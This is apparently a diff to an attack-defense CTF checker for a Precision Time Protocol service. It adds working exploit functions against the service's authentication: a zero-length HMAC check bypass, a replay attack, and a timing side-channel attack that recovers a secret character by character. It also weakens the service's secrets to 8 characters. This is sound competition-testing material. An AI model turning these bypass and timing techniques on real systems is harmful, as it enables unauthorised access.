@@ -10,6 +10,7 @@ import string
 import hmac
 import hashlib
 import struct
+import numpy as np
 
 from logging import LoggerAdapter
 
@@ -78,7 +79,7 @@ class UdpClientProtocol(asyncio.DatagramProtocol):
         return self.response
 
 class Connection:
-    BUFFER_SIZE = 1500
+    BUFFER_SIZE = 1472
 
     def __init__(self, protocol: UdpClientProtocol, logger: LoggerAdapter):
         self.protocol = protocol
@@ -135,7 +136,7 @@ def generate_port_id():
     return clock_id, port
 
 def generate_secret(length: int):
-    return (''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length)))
+    return (''.join(secrets.choice(string.printable) for _ in range(length)))
 
 def encode_port_id(clock_id: int, port: int):
     return hex(clock_id) + ":" + hex(port)
@@ -153,38 +154,43 @@ def policy_to_int(policy: str):
     else:
         raise InternalErrorException(f"Unknown policy {policy}")
 
-def add_auth_tlv(message, policy: str):
+def add_auth_tlv(message, policy: str, icv_length=None):
     tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
     tlv.payload.authentication.policy = policy_to_int(policy)
     tlv.payload.authentication.parameter_indicator = 0
     tlv.payload.authentication.key_id = 0
 
-    if policy == "hmac":
+    if icv_length is not None:
+        tlv.payload.authentication.icv_length = icv_length
+    elif policy == "hmac":
         tlv.payload.authentication.icv_length = 16
     elif policy == "plain":
         tlv.payload.authentication.icv_length = 100
     else:
         raise InternalErrorException(f"Unknown policy {policy}")
+    
+def finalize_auth_tlv(tlv, request, secret=b"", icv=None):
+    if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
+        return
+
+    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))
+    icv_address = tlv.payload.authentication.icv
+    
+    if tlv.payload.authentication.policy == policy_to_int("hmac"):
+        if icv is None:
+            icv = hmac.new(secret, bytearray(request)[:icv_address - buffer_address], hashlib.sha256).digest()
+    elif tlv.payload.authentication.policy == policy_to_int("plain"):
+        icv = secret + b'\0'
+    else:
+        raise InternalErrorException(f"Unknown policy in finalize")
+
+    ptp_protocol.ffi.memmove(icv_address, icv[:tlv.payload.authentication.icv_length], tlv.payload.authentication.icv_length)
 
 def finalize_auth_tlvs(request, secret=b"", icv=None):
     message = ptp_message.from_buffer(request)
-    buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))
 
     for tlv in message.get_tlvs():
-        if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
-            continue
-
-        icv_address = tlv.payload.authentication.icv
-        
-        if tlv.payload.authentication.policy == policy_to_int("hmac"):
-            if icv is None:
-                icv = hmac.new(secret, bytearray(request)[:icv_address - buffer_address], hashlib.sha256).digest()
-        elif tlv.payload.authentication.policy == policy_to_int("plain"):
-            icv = secret + b'\0'
-        else:
-            raise InternalErrorException(f"Unknown policy in finalize")
-
-        ptp_protocol.ffi.memmove(icv_address, icv[:tlv.payload.authentication.icv_length], tlv.payload.authentication.icv_length)
+        finalize_auth_tlv(tlv, request, secret, icv)
 
 async def claim_port(connection: Connection, logger: LoggerAdapter, clock_id: int, port: int, secret: bytes, policy: str, description: bytes, expect_error=False):
     if (len(secret) > 100):
@@ -345,7 +351,7 @@ async def putflag_user_description_hmac(
     await db.set("userdata", (clock_id, port, secret))
 
     return encode_port_id(clock_id, port)
-"""
+
 @checker.putflag(1)
 async def putflag_user_description_plain(
     task: PutflagCheckerTaskMessage,
@@ -354,14 +360,14 @@ async def putflag_user_description_plain(
     logger: LoggerAdapter,    
 ) -> None:
     clock_id, port = generate_port_id()
-    secret = generate_secret(50)
+    secret = generate_secret(8)
 
     await claim_port(connection, logger, clock_id, port, secret.encode("ascii"), "plain", task.flag.encode("utf-8"))
 
     await db.set("userdata", (clock_id, port, secret))
 
     return encode_port_id(clock_id, port)
-"""
+
 @checker.getflag(0)
 async def getflag_user_description_hmac(
     task: GetflagCheckerTaskMessage,
@@ -380,7 +386,7 @@ async def getflag_user_description_hmac(
         raise MumbleException("Received no USER_DESCRIPTION TLV")
     
     assert_equals(received_description, task.flag, "Received wrong flag")
-"""
+
 @checker.getflag(1)
 async def getflag_user_description_plain(
     task: GetflagCheckerTaskMessage,
@@ -396,7 +402,7 @@ async def getflag_user_description_plain(
     received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "plain")
 
     assert_equals(received_description, task.flag, "Received wrong flag")
-"""
+
 @checker.putnoise(0)
 async def putnoise_user_description_twice(
     task: PutnoiseCheckerTaskMessage,
@@ -461,7 +467,7 @@ async def havoc_get_time(
         last_time = current_time
 
 @checker.exploit(0)
-async def exploit_user_description_memcmp(
+async def exploit_memcmp(
     task: ExploitCheckerTaskMessage,
     connection: Connection,
     logger:LoggerAdapter
@@ -542,12 +548,55 @@ async def exploit_user_description_memcmp(
     for tlv in response.get_tlvs():
         if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
             if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                received_flag =  ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
+                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                 logger.debug(f"Received flag {received_flag}")
                 return received_flag
 
+
 @checker.exploit(1)
-async def exploit_user_description_replay(
+async def exploit_zerolength(
+    task: ExploitCheckerTaskMessage,
+    connection: Connection,
+    logger:LoggerAdapter
+) -> typing.Optional[str]:
+    if task.attack_info is None:
+        raise MumbleException("No attack info")
+    
+    clock_id, port = decode_port_id(task.attack_info)
+    local_clock_id, local_port = generate_port_id()
+
+    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)
+
+    payload = message.get_payload()
+    payload.management.target_port_id.clock_id = clock_id
+    payload.management.target_port_id.port = port
+    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
+    payload.management.starting_boundary_hops = 0
+    payload.management.boundary_hops = 0
+
+    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
+    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
+
+    add_auth_tlv(message, "hmac", 0)
+
+    connection.send(message)
+    response = await connection.receive()
+
+    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
+        raise MumbleException("Expected management message in response")
+    
+    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
+        raise MumbleException("Expected management response action")
+    
+    for tlv in response.get_tlvs():
+        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
+            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
+                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
+                logger.debug(f"Received flag {received_flag}")
+                return received_flag
+
+@checker.exploit(2)
+async def exploit_replay(
     task: ExploitCheckerTaskMessage,
     connection: Connection,
     logger:LoggerAdapter
@@ -598,9 +647,124 @@ async def exploit_user_description_replay(
     for tlv in response.get_tlvs():
         if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
             if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
-                received_flag =  ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
+                received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
                 logger.debug(f"Received flag {received_flag}")
                 return received_flag
+
+@checker.exploit(3)
+async def exploit_timing(
+    task: ExploitCheckerTaskMessage,
+    connection: Connection,
+    logger:LoggerAdapter
+) -> typing.Optional[str]:
+    if task.attack_info is None:
+        raise MumbleException("No attack info")
+    
+    clock_id, port = decode_port_id(task.attack_info)
+    local_clock_id, local_port = generate_port_id()
+
+    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)
+
+    payload = message.get_payload()
+    payload.management.target_port_id.clock_id = clock_id
+    payload.management.target_port_id.port = port
+    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
+    payload.management.starting_boundary_hops = 0
+    payload.management.boundary_hops = 0
+
+    for _ in range(10):
+        # Measure execution time (start time / end time of previous char)
+        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
+        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME
+
+        # Trigger auth TLV
+        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
+        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
+
+        # Auth TLV to measure
+        add_auth_tlv(message, "plain", 8)
+
+    # End time of last char
+    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
+    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME
+    
+    request = message.encode(connection.BUFFER_SIZE)
+    message = ptp_message.from_buffer(request)
+
+    secret = bytearray()
+
+    async def guess_char(secret):
+        durations = np.empty(len(string.printable))
+        i_request = 0
+        i_response = 0
+
+        while i_request < len(string.printable):
+            j = 0
+
+            for tlv in message.get_tlvs():
+                if i_request >= len(string.printable):
+                    break
+
+                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
+                    continue
+
+                character = string.printable[i_request].encode("ascii")
+                finalize_auth_tlv(tlv, request, secret + character)
+
+                if j >= 1:
+                    i_request += 1
+                
+                j += 1
+
+            connection.send_raw(request)
+            response = await connection.receive()
+
+            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
+                raise MumbleException("Expected management message")
+            
+            j = 0
+            for tlv in response.get_tlvs():
+                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
+                    continue
+
+                if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
+                    received_flag = ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()
+                    return None, None, received_flag
+                elif tlv.payload.management.id != ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
+                    continue
+
+                # The first measurement is garbage (likely due to cache misses)
+                if j >= 2:
+                    durations[i_response] = tlv.payload.management.payload.time - last_time
+                    i_response += 1
+
+                if i_response >= len(string.printable):
+                    break
+                
+                last_time = tlv.payload.management.payload.time
+                j += 1
+
+        guess = string.printable[np.argmax(durations)].encode("ascii")
+        sqrt_duration = np.sqrt(np.sum(durations))
+
+        return guess, sqrt_duration, None
+    
+    sqrt_durations = [0]
+
+    for _ in range(50):
+        guess, sqrt_duration, received_flag = await guess_char(bytes(secret))
+
+        if received_flag is not None:
+            logger.debug(f"Received flag {received_flag}")
+            return received_flag
+        
+        # Backtracking if we made an error due to noise
+        if np.abs(sqrt_duration - sqrt_durations[-1]) > 100:
+            secret += guess
+            sqrt_durations += [sqrt_duration]
+        else:
+            secret = secret[:-1]
+            sqrt_durations = sqrt_durations[:-1]
 
 if __name__ == "__main__":
     checker.run()
